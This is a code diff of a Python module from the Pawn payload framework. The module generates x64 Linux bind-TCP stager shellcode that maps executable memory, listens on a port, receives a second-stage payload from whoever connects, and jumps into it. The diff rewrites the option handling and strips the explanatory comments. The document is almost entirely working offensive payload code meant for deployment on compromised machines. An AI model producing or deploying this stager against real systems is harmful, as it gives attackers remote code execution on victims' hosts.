@@ -3,16 +3,14 @@ This module requires Pawn: https://github.com/EntySec/Pawn
 Current source: https://github.com/EntySec/Pawn
 """
 
-from typing import Optional
 from textwrap import dedent
 
 from pex.assembler import Assembler
-from pex.socket import Socket
 
-from pawn.lib.module import Module
+from pawn.lib.module import *
 
 
-class PawnModule(Module, Socket, Assembler):
+class PawnModule(Module, Assembler):
     def __init__(self):
         super().__init__()
 
@@ -21,107 +19,87 @@ class PawnModule(Module, Socket, Assembler):
             'Authors': [
                 'Ivan Nikolsky (enty8080) - payload developer'
             ],
-            'Architecture': "x64",
+            'Arch': "x64",
             'Platform': "linux",
-            'SendSize': False
+            'Type': "bind_tcp",
         })
 
-    def run(self, port: int, length: int = 4096) -> bytes:
-        port = self.pack_port(port)
+        self.port = PortOption(None, 'Port to bind to.', True)
+        self.length = IntegerOption(4096, 'Length of the implant.', True)
+        self.reliable = BooleanOption('yes', 'Make payload reliable.', True)
 
+    def run(self):
         payload = dedent(f"""\
-            start:
-                /*
-                 * Allocate space in memory for our phase
-                 * mmap(NULL, length, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0)
-                 */
-
-                push 0x9
-                pop rax
-                xor rdi, rdi
-                push {hex(length)}
-                pop rsi
-                push 0x7
-                pop rdx
-                xor r9, r9
-                push 0x22
-                pop r10
-                syscall
-
+        start:
+            push 0x9
+            pop  rax
+            xor  rdi, rdi
+            push {hex(self.length.value)}
+            pop  rsi
+            push 0x7
+            pop  rdx
+            xor  r9, r9
+            push 0x22
+            pop  r10
+            syscall
         """)
 
-        if reliable:
+        if self.reliable.value:
             payload += dedent("""\
-                    test rax, rax
-                    js fail
+                test rax, rax
+                js   fail
             """)
 
         payload += dedent(f"""\
-                push rax
+            push rax
 
-                /*
-                 * Set up socket for further communication with C2
-                 * socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
-                 */
+            push 0x29
+            pop  rax
+            cdq
+            push 0x2
+            pop  rdi
+            push 0x1
+            pop  rsi
+            syscall
 
-                push 0x29
-                pop rax
-                cdq
-                push 0x2
-                pop rdi
-                push 0x1
-                pop rsi
-                syscall
+            xchg rdi, rax
+            push rdx
+            mov  dword ptr [rsp], 0x{self.port.little.hex()}0002
+            mov  rsi, rsp
+            push 0x10
+            pop  rdx
+            push 0x32
+            pop  rax
+            syscall
 
-                xchg rdi, rax
-                push rdx
-                mov dword ptr [rsp], 0x{port.hex()}0002
-                mov rsi, rsp
-                push 0x10
-                pop rdx
-                push 0x32
-                pop rax
-                syscall
-
-                /*
-                 * Read phase to allocated memory space
-                 * recvfrom(rdi, rsi, length, MSG_WAITALL, NULL, 0)
-                 */
-
-                push 0x2d
-                pop rax
-                pop rsi
-                push {hex(length)}
-                pop rdx
-                push 0x100
-                pop r10
-                syscall
+            push 0x2d
+            pop  rax
+            pop  rsi
+            push {hex(self.length.value)}
+            pop  rdx
+            push 0x100
+            pop  r10
+            syscall
         """)
 
-        if reliable:
+        if self.reliable.value:
             payload += dedent("""\
-                    test rax, rax
-                    js fail
+                test rax, rax
+                js   fail
             """)
 
         payload += dedent("""\
-                /* Jump to the next phase */
-                jmp rsi
+            jmp rsi
         """)
 
-        if reliable:
+        if self.reliable.value:
             payload += dedent("""\
-                fail:
-                    /*
-                    * Exit phase in case of failure
-                    * exit(0)
-                    */
-
-                    push 0x3c
-                    pop rax
-                    xor rdi, rdi
-                    syscall
+            fail:
+                push 0x3c
+                pop  rax
+                xor  rdi, rdi
+                syscall
             """)
 
         return self.assemble(
-            self.details['Architecture'], payload)
+            self.details['Arch'], payload)
